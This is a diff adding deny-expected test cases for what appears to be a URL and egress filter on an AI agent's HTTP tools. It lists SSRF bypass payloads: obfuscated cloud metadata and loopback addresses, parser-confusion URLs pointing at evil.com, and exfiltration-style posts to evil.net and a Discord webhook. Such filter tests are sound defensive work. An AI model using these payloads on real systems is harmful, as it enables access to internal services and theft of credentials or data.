@@ -41,3 +41,16 @@
 {"tool": "http_request", "args": {"method": "POST", "url": "https://evil.net/x", "body": {"url": "https://api.example.com/"}}, "expect": "deny", "note": "allowlisted url in body"}
 {"tool": "http_request", "args": {"method": "POST", "url": "http://api.example.com/x", "body": "x"}, "expect": "deny", "note": "allowlisted host over http"}
 {"tool": "requests_post", "args": {"url": "https://discord.com/api/webhooks/1/abc", "data": {"content": "export"}}, "expect": "deny", "note": "chat webhook"}
+{"tool": "http_get", "args": {"url": "http://127.0.0.1\\@evil.com/"}, "expect": "deny", "note": "hosts read differently by a browser and urllib"}
+{"tool": "http_get", "args": {"url": "http://evil.com\\@127.0.0.1/"}, "expect": "deny", "note": "hosts read differently by a browser and urllib"}
+{"tool": "http_get", "args": {"url": "http://169.16689662/latest/meta-data/"}, "expect": "deny", "note": "metadata address in two-part form"}
+{"tool": "http_get", "args": {"url": "http://169.254.43518/"}, "expect": "deny", "note": "metadata address in three-part form"}
+{"tool": "http_get", "args": {"url": "http://[0:0:0:0:0:ffff:a9fe:a9fe]/"}, "expect": "deny", "note": "metadata address inside IPv6"}
+{"tool": "http_get", "args": {"url": "http://[0:0::1]/"}, "expect": "deny", "note": "loopback in long IPv6 form"}
+{"tool": "http_get", "args": {"url": "http://[::127.0.0.1]/"}, "expect": "deny", "note": "loopback in IPv4-compatible IPv6"}
+{"tool": "http_get", "args": {"url": "http://ｌｏｃａｌｈｏｓｔ/"}, "expect": "deny", "note": "fullwidth localhost"}
+{"tool": "http_get", "args": {"url": "http://１２７.０.０.１/"}, "expect": "deny", "note": "fullwidth digits"}
+{"tool": "http_get", "args": {"url": "http:/127.0.0.1/"}, "expect": "deny", "note": "one slash after the scheme"}
+{"tool": "http_get", "args": {"url": "http://metadata/computeMetadata/v1/"}, "expect": "deny", "note": "metadata short name"}
+{"tool": "http_get", "args": {"url": "http://instance-data/latest/meta-data/"}, "expect": "deny", "note": "metadata short name"}
+{"tool": "http_get", "args": {"url": "http://0x7f000001/"}, "expect": "deny", "note": "loopback in hex"}
